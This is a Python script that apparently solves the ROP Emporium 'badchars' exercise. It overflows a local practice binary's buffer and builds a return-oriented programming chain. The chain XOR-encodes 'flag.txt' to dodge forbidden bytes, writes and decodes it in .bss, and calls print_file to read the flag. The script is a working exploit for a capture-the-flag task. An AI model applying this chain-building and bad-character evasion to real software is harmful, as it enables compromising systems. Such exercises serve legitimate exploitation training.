import re
import struct
from subprocess import PIPE, Popen

BAD_CHARS = b"xga."
ELF_PATH = "./badchars"
# python -c "print(''.join(chr(b^2) for b in b'flag.txt'))"
FLAG_FILE_NAME = b"dnce,vzv"

# rabin2 -i ./badchars | grep print_file | awk '{print $2}'
PRINT_FILE = struct.pack("<Q", 0x00400510)
# rabin2 -S ./badchars | grep ".bss" | awk '{print $4}'
DATA_SECTIONS = [struct.pack("<Q", 0x00601038 + i) for i in range(8)]
# ROPgadget --binary ./badchars | grep "xor byte ptr \[r15\]" | awk '{print $1}'
XOR_R15P_R14 = struct.pack("<Q", 0x0000000000400628)
# ROPgadget --binary ./badchars | grep "pop rdi" | awk '{print $1}'
POP_RDI = struct.pack("<Q", 0x00000000004006A3)
# ROPgadget --binary ./badchars | grep "rsi" | awk '{print $1}'
POP_RSI_R15 = struct.pack("<Q", 0x00000000004006A1)
# ROPgadget --binary ./badchars | grep " : pop r15 ; ret" | awk '{print $1}'
POP_R15 = struct.pack("<Q", 0x00000000004006A2)
# ROPgadget --binary ./badchars | grep " : pop r12" | awk '{print $1}'
POP_R12_R13_R14_R15 = struct.pack("<Q", 0x000000000040069C)
# ROPgadget --binary ./badchars | grep "mov qword" | awk '{print $1}'
MOV_R13P_R12 = struct.pack("<Q", 0x0000000000400634)


JUNK = b"J" * 40
TWO = struct.pack("<Q", 2)
ZERO = struct.pack("<Q", 0)


payload = b""
payload += JUNK
payload += (
    POP_R12_R13_R14_R15 + FLAG_FILE_NAME + DATA_SECTIONS[0] + TWO + DATA_SECTIONS[0]
)
payload += MOV_R13P_R12

for i in range(8):
    payload += POP_R15 + DATA_SECTIONS[i]
    payload += XOR_R15P_R14

payload += POP_RDI + DATA_SECTIONS[0]
payload += POP_RSI_R15 + ZERO + ZERO
payload += PRINT_FILE


for c in BAD_CHARS:
    assert c not in payload

p = Popen(ELF_PATH, stdin=PIPE, stdout=PIPE, stderr=PIPE)
reply = p.communicate(payload)[0].decode()
flag = re.findall(r"ROPE{.+}", reply)[0]
print(flag)
